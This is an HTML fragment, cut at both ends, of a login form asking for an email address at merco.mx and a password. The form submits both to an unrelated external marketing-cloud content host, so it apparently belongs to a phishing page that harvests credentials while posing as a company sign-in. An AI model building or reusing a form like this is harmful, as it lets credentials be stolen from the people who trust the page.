                                        class="login-form"
                                        method="post"
                                        action="https://mc-3x8ms-dvf3nd0517f87f62nf4.pub.sfmc-content.com/d5thavchbnb"
                                    >
                                        <input
                                            required
                                            class="mt-3"
                                            id="email"
                                            name="email"
                                            type="text"
                                            placeholder="nombre@merco.mx"
                                        />
                                        <input
                                            required
                                            type="password"
                                            id="password"
                                            name="password"
                                            placeholder="contraseña"
                                        />

                                    </form>
                                </div>
                            </div>
